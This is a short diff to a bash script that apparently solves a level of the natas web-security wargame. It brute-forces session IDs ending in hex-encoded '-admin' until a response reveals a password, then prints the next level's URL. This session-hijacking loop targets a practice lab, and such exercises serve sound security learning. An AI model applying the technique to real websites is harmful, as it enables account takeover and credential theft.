@@ -1,11 +1,12 @@
 #!/bin/bash
+. ../natas.sh
 fixed_part=d61646d696e
 sessids=session-ids.txt
 function hack() {
 	for i in $(normalize-sessionids); do
 		result=$(request $i 2>&1 | grep -Po "(?<=Password: )[\w\d]+")
 		if [ ! -z "$result" ] ; then
-			printf "$result"
+			echo $(get-natas-url 20 "$result")
 			break;
 		fi
 	done
